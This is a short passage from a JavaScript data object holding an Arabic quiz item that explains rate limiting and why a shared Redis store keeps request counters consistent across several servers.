          { q: "ما هو Rate Limiting ولماذا نحتاج Redis في بيئة متعددة الخوادم؟", a: "Rate Limiting يحد عدد الطلبات لمنع الإساءة والـ Brute Force. في بيئة متعددة الخوادم، كل خادم يتذكر عداداته المحلية فقط. Redis مشترك بين الخوادم يضمن تطبيق الحد الصحيح بغض النظر عن الخادم الذي يستقبل الطلب." }
        ]}
      ]
    }
  ]
};
